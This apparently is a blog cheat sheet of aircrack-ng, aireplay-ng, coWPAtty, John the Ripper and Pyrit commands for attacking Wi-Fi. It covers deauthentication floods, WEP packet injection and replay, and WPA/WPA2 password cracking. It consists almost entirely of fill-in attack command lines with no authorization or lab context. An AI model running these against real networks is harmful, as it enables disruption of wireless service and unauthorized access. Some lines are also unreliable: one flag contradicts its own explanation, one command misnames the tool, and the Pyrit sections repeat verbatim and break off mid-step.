---
title: Attacking Wifi - Commands
categories: [Hacking, Pen Testing, Wireless, Aircrack-ng]
layout: post
---
This post will highlight many of the different aircrack-ng commands used in hacking/pen testing wireless networks.  This post does not go into the how, but is more of a reference of the commands and parameters.

* [General](#general)
  * [Monitor Mode](#monitor-mode)
  * [Scanning Networks](#scanning-networks)
  * [Deauthentication Attack](#deauthentication-attack)
* [Cracking](#cracking)
  * [IV-based Crack](#iv-based-crack)
  * [PTW Crack](#ptw-based-crack)
  * [Word List Crack](#word-list-based-crack)
  * [Airolib DB Crack](#airolib-db-crack)
  * [JTR-based Crack](#jtr-based-crack)
* [WEP Attacks](#wep-attacks)
  * [Fake Authentication](#fake-authentication)
  * [ARP Request Replay Attack](#arp-request-replay-attack)
  * [Interactive Packet Replay Attack](#interactive-packet-replay-attack)
  * [KoreK ChopChop Attack](#korek-chopchop-attack)
  * [Fragmentation Attack](#fragmentation-attack)
  * [Craft ARP Request Packet](#craft-arp-request-packet)
  * [Inject Packet](#inject-packet)
  * [Fake Shared Key Authentication](#fake-shared-key-authentication) 
  
## General

### Monitor Mode
There are a couple different options for putting your wifi adapter into monitor mode.

> `iw dev <interface> set monitor none`

> `airmon-ng start <interface>`

### Scanning Networks
Airodump-ng is used to scan for wifi networks and clients that are in the range of your wireless card

> `airodump-ng -c <channel> -w <capture> --wps --band abg --essid <essid> --bssid <bssid> <int>`

The required parameters
* `<int>` The wireless interface that is in monitor mode

The following flags are all optional
* `-c <channel>` This will filter your scan to a specific wifi channel
* `--wps` This flag will include WPS information for wireless networks found
* `-w <capture>` This flag will write the scan results to a file
* `--band <bands>` This flag allows you to only scan wifi networks operating on specified bands
* `--essid <essid>` This flag will filter the scan to a specific Client
* `--bssid <bssid>` This flag will filter the scan to a specific AP

### Deauthentication Attack
This attacks sends disassociate packets to one or more clients connected to a specific AP
> `aireplay-ng -0 <num> -a <ap> -c <client> <int>`

All parameters and flags are required
* `-0` Deauthentication attack method
* `<num>` The number of deauths to send, 0 will send continuously
* `-a <ap>` The mac address of the AP
* `-c <client>` The mac address of the client to deauthenticate
* `<int>` The wireless interface to use

## Cracking

The following are various methods that can be used to crack the authentication of wireless networks.

### IV-based Crack

The following is a method of IV-based cracking.  This is aircrack-ng's default
methed of cracking when no flags are provided.  This method only works for WEP,
not WPA/WPA2/WPA3. 
> `aircrack-ng <capture>`

### PTW-based Crack

The PTW attack is both the newest and most powerful WEP attack.  It only
require 20,000 to 40,000 packets to be successful, though in some cases as many
as 70,000 packets could be needed for a successful attack.
> `aircrack-ng -z <capture>`

* `-z` Invokes WEP PTW Attack mode

### Word List-based Crack

This method works for both WEP and WPA-PSK cracking.
> `aircrack-ng -w <wordlist> <capture>`

* `-w <wordlist>` The wordlist to use to try and crack WEP/WPA-PSK

### Airolib DB Crack

Airolib-ng is a tool for managing and storing ESSIDs and password lists, compute their Pairwise Master Keys, and use them to crack WPA and WPA2 passwords.
> `aircrack-ng -r <dbName> <capture>`

* `-r <dbName> - The name of the airolib-ng database`

### JTR-based Crack

This method uses John the Ripper and a wordlist while applying word mangling rules to attempt to crack a WPA/WPA2 Password
> `john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <essid> -w - <capture>`

* `--wordlist=<wordlist> - The word list to use`
* `--rules - apply word mangling rules`

## WEP Attacks

#### Fake Authentication

The fake authentication attack allows you to associate to an access point using either of the two types of WEP authentication: the open system and shared key authentication.  

This attack is useful in scenarios where there are no associated clients and you need to fake an authentication to the AP.
> `aireplay-ng -1 0 -e <essid> -a <ap> -h <you> <interface>`

* `-1 - Fake Authentication Attack`
* `0 - The reassociation timing in seconds`
* `-e <essid> - The wireless network name (ESSID)`
* `-a <ap> - The AP MAC address`
* `-h <you> - Your attacking MAC address`


#### ARP Request Replay Attack

The ARP request replay attack is the most effective way to generate new initialization vectors and of all the attacks Aireplay has to offer, this attack is probably the most reliable.

> `aireplay-ng -3 -b <ap> -h <you> <interface>`

* `-3 - ARP Request Replay Attack`
* `-b <ap> - The AP MAC address`
* `-h <you> - Your attacking MAC address`

For this attack, your wireless card needs to be in monitor mode and you will need either the MAC address of an associated client or your own MAC address after having performed a fake authentication with the AP.

#### Interactive Packet Replay Attack

The Interactive Packet Replay attack allows you to choose a specific packet for replaying/injecting against the target network.
> `aireplay-ng -2 -b <ap> -d ff:ff:ff:ff:ff:ff -f 1 -m 68 -n 86 <interface>`

* `-2 - Interactive Packet Replay Attack`
* `-b <ap> - The AP MAC address`
* `-d ff:ff:ff:ff:ff:ff - Select packets with a broadcast destination address`
* `-t 1 - Select packets with the "To Distribution System" flag set`
* `-m <num> - Minimum packet size`
* `-n <num> - Maximum packet size`

#### KoreK chopchop attack
> `aireplay-ng -4 -b <ap> -h <you> <interface>`

#### Fragmentaion Attack
> `aireplay-ng -5 -b <ap> -h <you> <interface>`

#### Craft ARP Request Packet**
> `packetforge-ng -0 -a <ap> -h <you> -l <sourceIP> -k <destIP> -y <xorFile> -w <out>`

#### Inject Packet**
> `aireplay-ng -2 -r <packet> <interface>`

#### Fake Shared Key Authentication
> `aireplay -1 -0 -e <essid> -y <captureFile> -a <ap> -h <you> <interface>`

## WPA Attacks

#### coWPAtty Attack 
> `cowpatty -r <capture> -f <wordlist> -2 -s <essid>`

#### Rainbow Table Generation
> `genpmk -f <wordlist> -d <hashesFilename> -s <essid>`

#### Rainbow Table coWPAtty Attack
> `cowpatty -r <capture> -d <hashesFilename> -2 -s <essid>`

#### Pyrit Sniff
> `pyrit -r <interface> -o <capture> stripLive`

#### Pyrit Crack Dictionary
> `pyrit -r <capture> -i <wordlist> -b <ap> attack_passthrough`

#### Pyrit Crack Database
Import Wordlist into Database
> `pyrit -i <wordlist> import_passwords`

Add the ESSID of the Access Point

#### Pyrit Crack Dictionary
> `pyrit -r <capture> -i <wordlist> -b <ap> attack_passthrough`

#### Pyrit Crack Database
Import Wordlist into Database
> `pyrit -i <wordlist> import_passwords`

Add the ESSID of the Access Point
